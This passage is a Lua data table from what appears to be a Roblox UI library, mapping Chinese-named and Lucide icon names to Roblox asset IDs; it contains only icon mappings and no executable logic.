	["暂停"] = "rbxassetid://7734021897",	["加粗"] = "rbxassetid://7733687211",
	["日历"] = "rbxassetid://7733919198",	["蓝牙"] = "rbxassetid://7733687147",
	["指针"] = "rbxassetid://7734042307",	["扳手"] = "rbxassetid://7743878358",
	["多云"] = "rbxassetid://7733747106",	["电影"] = "rbxassetid://7733942579",
	["图层"] = "rbxassetid://7743868936",	["语言"] = "rbxassetid://7733965249",
	["星号"] = "rbxassetid://7733673800",	["上标"] = "rbxassetid://8997388036",
	["命令"] = "rbxassetid://7733924046",	["平板"] = "rbxassetid://7743872620",
	["口袋"] = "rbxassetid://7734042139",	["手表"] = "rbxassetid://7743877668",
	["定位"] = "rbxassetid://7733992469",	["英镑"] = "rbxassetid://7734042354",
	["帐篷"] = "rbxassetid://7734078943",	["日出"] = "rbxassetid://7743872365",
	["日落"] = "rbxassetid://7734070982",	["版权"] = "rbxassetid://7733764196",
	["归档"] = "rbxassetid://7733911621",	["斜体"] = "rbxassetid://7733964917",
	["建筑"] = "rbxassetid://7733701625",	["烧杯"] = "rbxassetid://7733674922",
	["月亮"] = "rbxassetid://7743870134",	["眼镜"] = "rbxassetid://7733954403",
	["羽毛"] = "rbxassetid://7733777166",	["快进"] = "rbxassetid://7734058495",
	["下载"] = "rbxassetid://7733770755",	["眼睛"] = "rbxassetid://7733774602",
	["包裹"] = "rbxassetid://7734021469",	["皱眉"] = "rbxassetid://7733799591",
	["发送"] = "rbxassetid://7734053039",	["闹钟"] = "rbxassetid://7733656100",
	["滑块"] = "rbxassetid://7734058803",	["音乐"] = "rbxassetid://7734020554",
	["钞票"] = "rbxassetid://7733674153",	["硬盘"] = "rbxassetid://7733955793",
	["搜索"] = "rbxassetid://7734052925",	["斜杠"] = "rbxassetid://8997387644",
	["除法"] = "rbxassetid://7733769365",	["视图"] = "rbxassetid://7743876754",
	["无奈"] = "rbxassetid://7733993147",	["版权"] = "rbxassetid://7733764275",
	["减号"] = "rbxassetid://7734000129",	["山脉"] = "rbxassetid://7734008868",
	["咖啡"] = "rbxassetid://7733752630",	["画笔"] = "rbxassetid://7733701455",
	["登录"] = "rbxassetid://7733992604",	["上传"] = "rbxassetid://7743875428",
	["勾选"] = "rbxassetid://7733715400",	["剪刀"] = "rbxassetid://7734052570",
	["信息"] = "rbxassetid://7733964719",	["展开"] = "rbxassetid://7733771982",
	["相册"] = "rbxassetid://7733658133",	["书签"] = "rbxassetid://7733692043",
	["删除"] = "rbxassetid://7733768142",	["铲子"] = "rbxassetid://7734056878",
	["播客"] = "rbxassetid://7734042234",	["注销"] = "rbxassetid://7733992677",
	["点赞"] = "rbxassetid://7743873212",	["复制"] = "rbxassetid://7733764083",
	["斧头"] = "rbxassetid://7733674079",	["摇椅"] = "rbxassetid://7734051769",
	["圆形"] = "rbxassetid://7733919881",	["鬼魂"] = "rbxassetid://7743868000",
	["奖章"] = "rbxassetid://7733673987",	["盾牌"] = "rbxassetid://7734056608",
	["导入"] = "rbxassetid://7733964240",	["尺子"] = "rbxassetid://7734052157",
	["骷髅"] = "rbxassetid://7734058599",	["套索"] = "rbxassetid://7733967892",
	["播放"] = "rbxassetid://7743871480",	["飞机"] = "rbxassetid://7734037723",
	["盒子"] = "rbxassetid://7733917120",	["电源"] = "rbxassetid://7734042493",
	["地图"] = "rbxassetid://7733992829",	["信号"] = "rbxassetid://8997387546",
	["重做"] = "rbxassetid://7743871739",	["快进"] = "rbxassetid://7743867090",
	["抓取"] = "rbxassetid://7733954884",	["饼干"] = "rbxassetid://8997385628",
	["饼图"] = "rbxassetid://7734034378",	["充电"] = "rbxassetid://8997383136",
	["视频"] = "rbxassetid://7743876610",	["铃铛"] = "rbxassetid://7733911828",
	["火焰"] = "rbxassetid://7733798747",	["关机"] = "rbxassetid://7734042423",
	["撤销"] = "rbxassetid://7743874974",	["裁剪"] = "rbxassetid://7733765140",
	["震动"] = "rbxassetid://7743876302",	["心形"] = "rbxassetid://7733956134",
	["锁定"] = "rbxassetid://7733992528",	["旗帜"] = "rbxassetid://7733798691",
	["雪花"] = "rbxassetid://7734059180",	["汽车"] = "rbxassetid://7733708835",
	["衬衫"] = "rbxassetid://7734056672",	["重复1"] = "rbxassetid://7734051342",
	["重复2"] = "rbxassetid://7734051454",	["链接1"] = "rbxassetid://7733978098",
	["链接2"] = "rbxassetid://7743869163",	["地球1"] = "rbxassetid://7733954760",
	["地球2"] = "rbxassetid://7733954611",	["代码1"] = "rbxassetid://7733749837",
	["代码2"] = "rbxassetid://7733920644",	["列表1"] = "rbxassetid://7743869612",
	["列表2"] = "rbxassetid://7743869517",	["电视2"] = "rbxassetid://7743874599",
	["导航1"] = "rbxassetid://7734020989",	["导航2"] = "rbxassetid://7734020942",
	["分享1"] = "rbxassetid://7734053697",	["分享2"] = "rbxassetid://7734053595",
	["设置1"] = "rbxassetid://7734053495",	["设置2"] = "rbxassetid://8997386997",
    ["文件1"] = "rbxassetid://7743867554",	["文件2"] = "rbxassetid://7733793319",
	["文件3"] = "rbxassetid://7743867811",	["音量1"] = "rbxassetid://7743877081",
	["音量2"] = "rbxassetid://7743877250",	["音量3"] = "rbxassetid://7743877487",
	["编辑1"] = "rbxassetid://7733771472",	["编辑2"] = "rbxassetid://7733771217",
	["编辑3"] = "rbxassetid://7733771361",	["时钟1"] = "rbxassetid://8997383694",
	["时钟2"] = "rbxassetid://8997384295",	["时钟3"] = "rbxassetid://8997384456",
	["时钟4"] = "rbxassetid://8997384603",	["时钟5"] = "rbxassetid://8997384798",
	["时钟6"] = "rbxassetid://8997384977",	["时钟7"] = "rbxassetid://8997385147",
	["时钟8"] = "rbxassetid://8997385352",	["时钟9"] = "rbxassetid://8997385485",
	["时钟10"] = "rbxassetid://8997383876", ["时钟11"] = "rbxassetid://8997384034",
	["时钟12"] = "rbxassetid://8997384150",	["时钟13"] = "rbxassetid://7733734848",
	["云-雨"] = "rbxassetid://7733746651",	["云-雪"] = "rbxassetid://7733746798",
	["Wi-Fi"] = "rbxassetid://7743878148",	["左对齐"] = "rbxassetid://7733911357",
	["右对齐"] = "rbxassetid://7733663582",	["文件夹"] = "rbxassetid://7733799185",
	["无穷大"] = "rbxassetid://7733964640", ["右上角"] = "rbxassetid://7733764915",
	["上右角"] = "rbxassetid://7733764680",	["左上角"] = "rbxassetid://7733764536",
	["右下角1"] = "rbxassetid://7733764605", ["左下角"] = "rbxassetid://7733764448",
	["首选项"] = "rbxassetid://8997383275",	["安全帽"] = "rbxassetid://7733955850",
	["荧光笔"] = "rbxassetid://7743868648", ["自行车"] = "rbxassetid://7733678330",
	["服务器"] = "rbxassetid://7734053426", ["阴影框"] = "rbxassetid://297694300",
	["笔工具"] = "rbxassetid://7734022041",	["显示器"] = "rbxassetid://7734002839",
	["删除线"] = "rbxassetid://7734068425", ["麦克风"] = "rbxassetid://7743869805",
	["瞄准器"] = "rbxassetid://7733765307",	["扩音器"] = "rbxassetid://7733993049",
	["龙卷风"] = "rbxassetid://7743873633",	["二维码"] = "rbxassetid://7743871575",
	["图书馆"] = "rbxassetid://7743869054", ["充电中"] = "rbxassetid://7734021231",
	["左下角1"] = "rbxassetid://7733764327", ["信号低"] = "rbxassetid://8997387189",
	["三角形"] = "rbxassetid://7743874367",	["侧边栏"] = "rbxassetid://7734058260",
	["西格玛"] = "rbxassetid://7734058345", ["云关闭"] = "rbxassetid://7733745572",
	["收件箱"] = "rbxassetid://7733964370",	["礼品卡"] = "rbxassetid://7733945018",
	["摄像头"] = "rbxassetid://7743877896",	["手电筒"] = "rbxassetid://7733798851",
	["数据库"] = "rbxassetid://7743866778",	["魔法棒"] = "rbxassetid://8997388430",
	["温度计"] = "rbxassetid://7734084149",	["机器人"] = "rbxassetid://7733916988",
	["不等于"] = "rbxassetid://7733771726",	["毕业帽"] = "rbxassetid://7733955058",
	["三叶草"] = "rbxassetid://7733747233",	["仪表盘"] = "rbxassetid://7733799969",
	["书打开"] = "rbxassetid://7733687281",	["回形针"] = "rbxassetid://7734021680",
	["收音机"] = "rbxassetid://7743871662",	["调色板"] = "rbxassetid://7734021595",
	["八边形"] = "rbxassetid://7734021165",	["购物袋"] = "rbxassetid://7734056747",
	["对比度"] = "rbxassetid://7733764005", ["胡萝卜"] = "rbxassetid://8997382987",
	["二进制"] = "rbxassetid://7733678388",	["公文包"] = "rbxassetid://7733919017",
	["过滤器"] = "rbxassetid://7733798407",	["计算器"] = "rbxassetid://7733919105",
	["救生圈"] = "rbxassetid://7733973479",	["存钱罐"] = "rbxassetid://7734034513",
	["百分比"] = "rbxassetid://7743870852",	["联系人"] = "rbxassetid://7743866666",
	["下箭头"] = "rbxassetid://7733717447",	["六边形"] = "rbxassetid://7743868527",
	["正方形"] = "rbxassetid://7743872181",	["已验证"] = "rbxassetid://7743876142",
	["公交车"] = "rbxassetid://7733701715",	["购物车"] = "rbxassetid://7734056813",
	["代码笔"] = "rbxassetid://7733920768",	["下划线"] = "rbxassetid://7743874904",
	["扫描线"] = "rbxassetid://8997386772",	["下载云"] = "rbxassetid://7733770689",
	["计时器"] = "rbxassetid://7743873443", ["打印机"] = "rbxassetid://7734042580",
	["指南针"] = "rbxassetid://7733924216",	["扬声器"] = "rbxassetid://7734063416",
	["剪贴板"] = "rbxassetid://7733734762",	["条形图1"] = "rbxassetid://7733674319",
	["条形图2"] = "rbxassetid://7733674239",["加载器1"] = "rbxassetid://7733992358",
	["加载器2"] = "rbxassetid://7733989869",
	["最小化1"] = "rbxassetid://7733997941",
	["最小化2"] = "rbxassetid://7733997870",
	["最大化1"] = "rbxassetid://7733992901",
	["最大化2"] = "rbxassetid://7733992982",
	["垃圾桶1"] = "rbxassetid://7743873871",
	["垃圾桶2"] = "rbxassetid://7743873772",
	["GITLAD"] = "rbxassetid://7733954246",
	["Airplay"] = "rbxassetid://7733655834",
	["treLLO"] = "rbxassetid://7743873996",
	["github"] = "rbxassetid://7733954058",
	["FIGMA"] = "rbxassetid://7743867310",
	["dribbble"] = "rbxassetid://7733770843",
	["金属-手"] = "rbxassetid://7733955664",
	["信号-零"] = "rbxassetid://8997387434",
	["水滴-多"] = "rbxassetid://7733771078",
	["切换-右"] = "rbxassetid://7743873539",
	["星形-半"] = "rbxassetid://7734068258",
	["信号-高"] = "rbxassetid://8997387110",
	["上传-云"] = "rbxassetid://7743875358",
	["云-闪电"] = "rbxassetid://7733741741",
	["云-细雨"] = "rbxassetid://7733920226",
	["云-冰雹"] = "rbxassetid://7733920444",
	["云-月亮"] = "rbxassetid://7733920519",
	["云-太阳"] = "rbxassetid://7733746880",
	["切换-左"] = "rbxassetid://7734091286",
	["电池-满"] = "rbxassetid://7733674503",
	["wifi-关闭"] = "rbxassetid://7743878056",
	["GIT-合并"] = "rbxassetid://7733952195",
	["GIT-分支"] = "rbxassetid://7733949149",
	["GIT-提交"] = "rbxassetid://7743868360",
	["云-雨-风"] = "rbxassetid://7733746456",
	["语音信箱"] = "rbxassetid://7743876916",
	["水平移动"] = "rbxassetid://7734016210",
	["瑞士法郎"] = "rbxassetid://7734071038",
	["垂直移动"] = "rbxassetid://7743870608",
	["居中对齐"] = "rbxassetid://7733909776",
	["泽西岛镑"] = "rbxassetid://7733965029",
	["换行文本"] = "rbxassetid://8997388548",
	["列表检查"] = "rbxassetid://7743869317",
	["文件文本"] = "rbxassetid://7733789088",
	["文本光标"] = "rbxassetid://8997388195",
	["文件搜索"] = "rbxassetid://7733788966",
	["蓝牙关闭"] = "rbxassetid://7733914252",
	["用户检查"] = "rbxassetid://7743875503",
	["对角移动"] = "rbxassetid://7743870505",
	["闹钟减号"] = "rbxassetid://7733656164",
	["减号圆形"] = "rbxassetid://7733998053",
	["随机播放"] = "rbxassetid://7734057059",
	["除号圆形"] = "rbxassetid://7733769152",
	["垂直拉伸"] = "rbxassetid://8997387862",
	["美元符号"] = "rbxassetid://7733770599",
	["切换相机"] = "rbxassetid://7743872492",
	["相机关闭"] = "rbxassetid://7733919260",
	["大右箭头"] = "rbxassetid://7733671493",
	["大左箭头"] = "rbxassetid://7733911731",
	["大下箭头"] = "rbxassetid://7733668653",
	["向上箭头"] = "rbxassetid://7733673717",
	["大上箭头"] = "rbxassetid://7733671663",
	["向下箭头"] = "rbxassetid://7733672933",
	["双头箭头"] = "rbxassetid://7733720483",
	["左右箭头"] = "rbxassetid://8997382869",
	["左向箭头"] = "rbxassetid://7733673136",
	["右向箭头"] = "rbxassetid://7733673345",
	["两端对齐"] = "rbxassetid://7733661326",
	["外部链接"] = "rbxassetid://7743866903",
	["禁止进入"] = "rbxassetid://7734021118",
	["水平拉伸"] = "rbxassetid://8997387754",
	["包裹搜索"] = "rbxassetid://8997386448",
	["水平握把"] = "rbxassetid://7733955302",
	["减少缩进"] = "rbxassetid://7734021384",
	["有序列表"] = "rbxassetid://7743869411",
	["更多垂直"] = "rbxassetid://7734006187",
	["包裹加号"] = "rbxassetid://8997386355",
	["智能手机"] = "rbxassetid://7734058979",
	["站立的人"] = "rbxassetid://7743871002",
	["印度卢比"] = "rbxassetid://7733964536",
	["电话关闭"] = "rbxassetid://7734029534",
	["艾特符号"] = "rbxassetid://7733673907",
	["铃铛关闭"] = "rbxassetid://7733675107",
	["蓝牙搜索"] = "rbxassetid://7733914320",
	["视频关闭"] = "rbxassetid://7743876466",
	["关闭盾牌"] = "rbxassetid://7734056470",
	["电力关闭"] = "rbxassetid://7733771563",
	["定位固定"] = "rbxassetid://7733992424",
	["回复全部"] = "rbxassetid://7734051524",
	["垂直握把"] = "rbxassetid://7733955410",
	["盾牌检查"] = "rbxassetid://7734056411",
	["鼠标指针"] = "rbxassetid://7734010405",
	["文件输出"] = "rbxassetid://7733788742",
	["电话转接"] = "rbxassetid://7734027345",
	["屏幕共享"] = "rbxassetid://7734052814",
	["叉号圆形"] = "rbxassetid://7743878496",
	["铃铛加号"] = "rbxassetid://7733675181",
	["电池中等"] = "rbxassetid://7733674731",
	["帮助圆形"] = "rbxassetid://7733956210",
	["取消链接1"] = "rbxassetid://7743875149",
	["取消链接2"] = "rbxassetid://7743875069",
	["游戏手柄1"] = "rbxassetid://7733799901",
	["游戏手柄2"] = "rbxassetid://7733799795",
	["文件检查1"] = "rbxassetid://7733779668",
	["文件检查2"] = "rbxassetid://7733779610",
	["左上角-上"] = "rbxassetid://7733764800",
	["右下角-下"] = "rbxassetid://7733764385",
	["用户-加号"] = "rbxassetid://7743875759",
	["趋势-下降"] = "rbxassetid://7743874143",
	["电话-拨出"] = "rbxassetid://7743871253",
	["盾牌-警告"] = "rbxassetid://7734056326",
	["闹钟-勾选"] = "rbxassetid://7733655912",
	["闹钟-关闭"] = "rbxassetid://7733656003",
	["点赞-向下"] = "rbxassetid://7734084236",
	["趋势-上升"] = "rbxassetid://7743874262",
	["文件-叉号"] = "rbxassetid://7733938136",
	["暂停-圆形"] = "rbxassetid://7734021767",
	["列表-加号"] = "rbxassetid://7733984995",
	["书签-加号"] = "rbxassetid://7734111084",
	["盒子-选择"] = "rbxassetid://7733696665",
	["消息-圆形"] = "rbxassetid://7733993311",
	["电池-充电"] = "rbxassetid://7733674402",
	["文件-代码"] = "rbxassetid://7733779730",
	["包裹-叉号"] = "rbxassetid://8997386545",
	["圆形-斜杠"] = "rbxassetid://8997383530",
	["停止-圆形"] = "rbxassetid://7734068379",
	["铃铛-减号"] = "rbxassetid://7733675028",
	["铃铛-响铃"] = "rbxassetid://7733675275",
	["加号-圆形"] = "rbxassetid://7734040271",
	["电话-未接"] = "rbxassetid://7734029465",
	["鼠标-指针"] = "rbxassetid://7743870392",
    ["排序-降序"] = "rbxassetid://7743871973",
    ["眼睛-关闭"] = "rbxassetid://7733774495",
    ["音量-关闭"] = "rbxassetid://7743877381",
    ["用户-减号"] = "rbxassetid://7743875629",
	["烧瓶-圆形"] = "rbxassetid://7733798957",
	["闹钟-加号"] = "rbxassetid://7733658066",
	["布局-网格"] = "rbxassetid://7733970390",
	["包裹-检查"] = "rbxassetid://8997386143",
	["缩小-放大"] = "rbxassetid://7743879082",
	["包裹-减号"] = "rbxassetid://8997386266",
	["套索-选择"] = "rbxassetid://7743868832",
	["电话-呼叫"] = "rbxassetid://7734027264",
	["地图-图钉"] = "rbxassetid://7733992789",
	["列表-减号"] = "rbxassetid://7733980795",
	["向上-箭头"] = "rbxassetid://7733919605",
	["布局-模板"] = "rbxassetid://7733970494",
	["盾牌-关闭"] = "rbxassetid://7734056540",
	["信号-中等"] = "rbxassetid://8997387319",
	["图片-关闭"] = "rbxassetid://7733963907",
	["向左-箭头"] = "rbxassetid://7733717651",
	["烧瓶-锥形"] = "rbxassetid://7733798901",
	["书签-减号"] = "rbxassetid://7733689754",
	["用户-叉号"] = "rbxassetid://7743875879",
	["警告-圆形"] = "rbxassetid://7733658271",
	["表单-输入"] = "rbxassetid://7733799275",
	["播放-圆形"] = "rbxassetid://7734037784",
	["文件-输入"] = "rbxassetid://7733935917",
	["文件-数字"] = "rbxassetid://7733935829",
	["布局-列表"] = "rbxassetid://7733970442",
	["图片-减号"] = "rbxassetid://7733963797",
	["排序-升序"] = "rbxassetid://7734060715",
	["图片-加号"] = "rbxassetid://7733964016",
	["更多-水平"] = "rbxassetid://7734006080",
	["勾选-圆形1"] = "rbxassetid://7733919427",
	["勾选-圆形2"] = "rbxassetid://7733710700",
	["文件-加号1"] = "rbxassetid://7733788885",
	["文件-加号2"] = "rbxassetid://7733788816",
	["文件-减号1"] = "rbxassetid://7733936115",
	["文件-减号2"] = "rbxassetid://7733936010",
	["顺时针旋转"] = "rbxassetid://7734051957",
	["逆时针旋转"] = "rbxassetid://7734051861",
	["刷新顺时针"] = "rbxassetid://7734051052",
	["文件夹减号"] = "rbxassetid://7733799022",
	["剪贴板检查"] = "rbxassetid://7733919947",
	["谷歌浏览器"] = "rbxassetid://7733919783",
	["俄罗斯卢布"] = "rbxassetid://7734052248",
	["上下双箭头"] = "rbxassetid://7733723321",
	["右向圆箭头"] = "rbxassetid://7733673229",
	["向上双箭头"] = "rbxassetid://7733723433",
	["向下右箭头"] = "rbxassetid://7733672831",
	["向上左箭头"] = "rbxassetid://7733673539",
	["左向圆箭头"] = "rbxassetid://7733673056",
	["水平分隔线"] = "rbxassetid://7734053146",
	["服务器崩溃"] = "rbxassetid://7734053281",
	["计时器关闭"] = "rbxassetid://8997388325",
	["加号正方形"] = "rbxassetid://7734040369",
	["计时器重置"] = "rbxassetid://7743873336",
	["剪贴板列表"] = "rbxassetid://7733920117",
	["显示器关闭"] = "rbxassetid://7734000184",
	["熄灭的灯泡"] = "rbxassetid://7733975123",
	["手电筒关闭"] = "rbxassetid://7733798799",
	["函数正方形"] = "rbxassetid://7733799682",
	["警告三角形"] = "rbxassetid://7733658504",
	["正则表达式"] = "rbxassetid://7734051188",
	["垂直分隔线"] = "rbxassetid://7734053213",
	["服务器-关闭"] = "rbxassetid://7734053361",
	["剪贴板-叉号"] = "rbxassetid://7733734668",
	["温度计-雪花"] = "rbxassetid://7743873074",
	["最后-双箭头"] = "rbxassetid://8997383390",
	["链接-2-关闭"] = "rbxassetid://7733975283",
	["剪贴板-复制"] = "rbxassetid://7733920037",
	["勾选-正方形"] = "rbxassetid://7733919526",
	["向上-右箭头"] = "rbxassetid://7733673646",
	["叉号-正方形"] = "rbxassetid://7743878737",
	["减号-正方形"] = "rbxassetid://7743869899",
	["终端-正方形"] = "rbxassetid://7734079055",
	["消息-正方形"] = "rbxassetid://7733993369",
	["叉号-八边形"] = "rbxassetid://7743878618",
	["电池-低电量"] = "rbxassetid://7733674589",
	["刷新-逆时针"] = "rbxassetid://7734050715",
	["布局-仪表盘"] = "rbxassetid://7733970318",
	["文件夹-打开"] = "rbxassetid://8997386062",
	["麦克风-关闭"] = "rbxassetid://7743869714",
	["侧边栏-关闭"] = "rbxassetid://7734058092",
	["警告-八边形"] = "rbxassetid://7733658335",
	["向下-左箭头"] = "rbxassetid://7733672282",
	["侧边栏-打开"] = "rbxassetid://7734058165",
	["暂停-八边形"] = "rbxassetid://7734021827",
	["向下-双箭头"] = "rbxassetid://7733720604",
	["向左-双箭头"] = "rbxassetid://7733720701",
    ["XGO1"]= "rbxassetid://123698784885744",
	["XGO2"]= "rbxassetid://88666635012556",
	["XGO3"]= "rbxassetid://102797584513959",
	["XGO4"]= "rbxassetid://96996396016819",
	["XGO5"]= "rbxassetid://128885038925647",
	["XGO6"]= "rbxassetid://120611289434746",
	["XGO7"]= "rbxassetid://86451637909512",
	["XGO8"]= "rbxassetid://109948306798374",
	["XGO9"]= "rbxassetid://92630758837243",
	["向下箭头-圆形"] = "rbxassetid://7733671763",
	["收音机-接收器"] = "rbxassetid://7734045155",
	["垂直结束对齐"] = "rbxassetid://8997380907",
	["向上箭头-圆形"] = "rbxassetid://7733673466",
	["git-分支-加号"] = "rbxassetid://7743868200",
	["屏幕共享-关闭"] = "rbxassetid://7734052653",
	["git-拉取请求"] = "rbxassetid://7733952287",
	["对角线移动-2"] = "rbxassetid://7734013178",
	["水平结束对齐"] = "rbxassetid://8997380820",
	["蓝牙-已连接"] = "rbxassetid://7734110952",
	["除号-正方形"] = "rbxassetid://7733769261",
	["温度计-太阳"] = "rbxassetid://7734084018",
	["文件夹-加号"] = "rbxassetid://7733799092",
	["笔记本电脑1"] = "rbxassetid://7733965386",
	["笔记本电脑2"] = "rbxassetid://7733965313",
	["向右-双箭头1"] = "rbxassetid://7733717755",
	["向右-双箭头2"] = "rbxassetid://7733919682",
    ["水平分布-结束"] = "rbxassetid://8997381144",
	["垂直分布-结束"] = "rbxassetid://8997382326",
	["垂直居中对齐"] = "rbxassetid://8997380737",
	["垂直开始对齐"] = "rbxassetid://8997382085",
	["垂直居中分布"] = "rbxassetid://8997382212",
	["水平开始对齐"] = "rbxassetid://8997381965",
	["水平分布开始"] = "rbxassetid://8997381290",
	["智能手机充电"] = "rbxassetid://7734058894",
	["水平居中对齐"] = "rbxassetid://8997380477",
	["旗帜-三角形-右"] = "rbxassetid://7733798634",
	["鼠标-指针-点击"] = "rbxassetid://7734010488",
	["水平分布-居中"] = "rbxassetid://8997381028",
	["codesandbox"] = "rbxassetid://7733752575",
	["垂直分布-开始"] = "rbxassetid://8997382428",
	["监视器-扬声器"] = "rbxassetid://7743869988",
	["文本-光标-输入"] = "rbxassetid://8997388094",
	["旗帜-三角形-左"] = "rbxassetid://7733798509",
	["水平两端对齐-居中"] = "rbxassetid://8997381461",
	["水平两端对齐-开始"] = "rbxassetid://8997381652",
	["水平两端对齐-结束"] = "rbxassetid://8997381549",
	["垂直两端对齐-开始"] = "rbxassetid://8997382639",
	["垂直两端对齐-结束"] = "rbxassetid://8997382584",
	["垂直居中对齐-结束"] = "rbxassetid://8997382502",
	["垂直间距-四周分散"] = "rbxassetid://8997382708",
	["垂直间距-两端对齐"] = "rbxassetid://8997382793",
	["水平间距-两端对齐"] = "rbxassetid://8997381854",
	["水平间距-两端对齐1"] = "rbxassetid://8997381738"
};

Library.Icons2 = {
	["lucide-accessibility"] = "rbxassetid://10709751939",
	["lucide-activity"] = "rbxassetid://10709752035",
	["lucide-air-vent"] = "rbxassetid://10709752131",
	["lucide-airplay"] = "rbxassetid://10709752254",
	["lucide-alarm-check"] = "rbxassetid://10709752405",
	["lucide-alarm-clock"] = "rbxassetid://10709752630",
	["lucide-alarm-clock-off"] = "rbxassetid://10709752508",
	["lucide-alarm-minus"] = "rbxassetid://10709752732",
	["lucide-alarm-plus"] = "rbxassetid://10709752825",
	["lucide-album"] = "rbxassetid://10709752906",
	["lucide-alert-circle"] = "rbxassetid://10709752996",
	["lucide-alert-octagon"] = "rbxassetid://10709753064",
	["lucide-alert-triangle"] = "rbxassetid://10709753149",
	["lucide-align-center"] = "rbxassetid://10709753570",
	["lucide-align-center-horizontal"] = "rbxassetid://10709753272",
	["lucide-align-center-vertical"] = "rbxassetid://10709753421",
	["lucide-align-end-horizontal"] = "rbxassetid://10709753692",
	["lucide-align-end-vertical"] = "rbxassetid://10709753808",
	["lucide-align-horizontal-distribute-center"] = "rbxassetid://10747779791",
	["lucide-align-horizontal-distribute-end"] = "rbxassetid://10747784534",
	["lucide-align-horizontal-distribute-start"] = "rbxassetid://10709754118",
	["lucide-align-horizontal-justify-center"] = "rbxassetid://10709754204",
	["lucide-align-horizontal-justify-end"] = "rbxassetid://10709754317",
	["lucide-align-horizontal-justify-start"] = "rbxassetid://10709754436",
	["lucide-align-horizontal-space-around"] = "rbxassetid://10709754590",
	["lucide-align-horizontal-space-between"] = "rbxassetid://10709754749",
	["lucide-align-justify"] = "rbxassetid://10709759610",
	["lucide-align-left"] = "rbxassetid://10709759764",
	["lucide-align-right"] = "rbxassetid://10709759895",
	["lucide-align-start-horizontal"] = "rbxassetid://10709760051",
	["lucide-align-start-vertical"] = "rbxassetid://10709760244",
	["lucide-align-vertical-distribute-center"] = "rbxassetid://10709760351",
	["lucide-align-vertical-distribute-end"] = "rbxassetid://10709760434",
	["lucide-align-vertical-distribute-start"] = "rbxassetid://10709760612",
	["lucide-align-vertical-justify-center"] = "rbxassetid://10709760814",
	["lucide-align-vertical-justify-end"] = "rbxassetid://10709761003",
	["lucide-align-vertical-justify-start"] = "rbxassetid://10709761176",
	["lucide-align-vertical-space-around"] = "rbxassetid://10709761324",
	["lucide-align-vertical-space-between"] = "rbxassetid://10709761434",
	["lucide-anchor"] = "rbxassetid://10709761530",
	["lucide-angry"] = "rbxassetid://10709761629",
	["lucide-annoyed"] = "rbxassetid://10709761722",
	["lucide-aperture"] = "rbxassetid://10709761813",
	["lucide-apple"] = "rbxassetid://10709761889",
	["lucide-archive"] = "rbxassetid://10709762233",
	["lucide-archive-restore"] = "rbxassetid://10709762058",
	["lucide-armchair"] = "rbxassetid://10709762327",
	["lucide-arrow-big-down"] = "rbxassetid://10747796644",
	["lucide-arrow-big-left"] = "rbxassetid://10709762574",
	["lucide-arrow-big-right"] = "rbxassetid://10709762727",
	["lucide-arrow-big-up"] = "rbxassetid://10709762879",
	["lucide-arrow-down"] = "rbxassetid://10709767827",
	["lucide-arrow-down-circle"] = "rbxassetid://10709763034",
	["lucide-arrow-down-left"] = "rbxassetid://10709767656",
	["lucide-arrow-down-right"] = "rbxassetid://10709767750",
	["lucide-arrow-left"] = "rbxassetid://10709768114",
	["lucide-arrow-left-circle"] = "rbxassetid://10709767936",
	["lucide-arrow-left-right"] = "rbxassetid://10709768019",
	["lucide-arrow-right"] = "rbxassetid://10709768347",
	["lucide-arrow-right-circle"] = "rbxassetid://10709768226",
	["lucide-arrow-up"] = "rbxassetid://10709768939",
	["lucide-arrow-up-circle"] = "rbxassetid://10709768432",
	["lucide-arrow-up-down"] = "rbxassetid://10709768538",
	["lucide-arrow-up-left"] = "rbxassetid://10709768661",
	["lucide-arrow-up-right"] = "rbxassetid://10709768787",
	["lucide-asterisk"] = "rbxassetid://10709769095",
	["lucide-at-sign"] = "rbxassetid://10709769286",
	["lucide-award"] = "rbxassetid://10709769406",
	["lucide-axe"] = "rbxassetid://10709769508",
	["lucide-axis-3d"] = "rbxassetid://10709769598",
	["lucide-baby"] = "rbxassetid://10709769732",
	["lucide-backpack"] = "rbxassetid://10709769841",
	["lucide-baggage-claim"] = "rbxassetid://10709769935",
	["lucide-banana"] = "rbxassetid://10709770005",
	["lucide-banknote"] = "rbxassetid://10709770178",
	["lucide-bar-chart"] = "rbxassetid://10709773755",
	["lucide-bar-chart-2"] = "rbxassetid://10709770317",
	["lucide-bar-chart-3"] = "rbxassetid://10709770431",
	["lucide-bar-chart-4"] = "rbxassetid://10709770560",
	["lucide-bar-chart-horizontal"] = "rbxassetid://10709773669",
	["lucide-barcode"] = "rbxassetid://10747360675",
	["lucide-baseline"] = "rbxassetid://10709773863",
	["lucide-bath"] = "rbxassetid://10709773963",
	["lucide-battery"] = "rbxassetid://10709774640",
	["lucide-battery-charging"] = "rbxassetid://10709774068",
	["lucide-battery-full"] = "rbxassetid://10709774206",
	["lucide-battery-low"] = "rbxassetid://10709774370",
	["lucide-battery-medium"] = "rbxassetid://10709774513",
	["lucide-beaker"] = "rbxassetid://10709774756",
	["lucide-bed"] = "rbxassetid://10709775036",
	["lucide-bed-double"] = "rbxassetid://10709774864",
	["lucide-bed-single"] = "rbxassetid://10709774968",
	["lucide-beer"] = "rbxassetid://10709775167",
	["lucide-bell"] = "rbxassetid://10709775704",
	["lucide-bell-minus"] = "rbxassetid://10709775241",
	["lucide-bell-off"] = "rbxassetid://10709775320",
	["lucide-bell-plus"] = "rbxassetid://10709775448",
	["lucide-bell-ring"] = "rbxassetid://10709775560",
	["lucide-bike"] = "rbxassetid://10709775894",
	["lucide-binary"] = "rbxassetid://10709776050",
	["lucide-bitcoin"] = "rbxassetid://10709776126",
	["lucide-bluetooth"] = "rbxassetid://10709776655",
	["lucide-bluetooth-connected"] = "rbxassetid://10709776240",
	["lucide-bluetooth-off"] = "rbxassetid://10709776344",
	["lucide-bluetooth-searching"] = "rbxassetid://10709776501",
	["lucide-bold"] = "rbxassetid://10747813908",
	["lucide-bomb"] = "rbxassetid://10709781460",
	["lucide-bone"] = "rbxassetid://10709781605",
	["lucide-book"] = "rbxassetid://10709781824",
	["lucide-book-open"] = "rbxassetid://10709781717",
	["lucide-bookmark"] = "rbxassetid://10709782154",
	["lucide-bookmark-minus"] = "rbxassetid://10709781919",
	["lucide-bookmark-plus"] = "rbxassetid://10709782044",
	["lucide-bot"] = "rbxassetid://10709782230",
	["lucide-box"] = "rbxassetid://10709782497",
	["lucide-box-select"] = "rbxassetid://10709782342",
	["lucide-boxes"] = "rbxassetid://10709782582",
	["lucide-briefcase"] = "rbxassetid://10709782662",
	["lucide-brush"] = "rbxassetid://10709782758",
	["lucide-bug"] = "rbxassetid://10709782845",
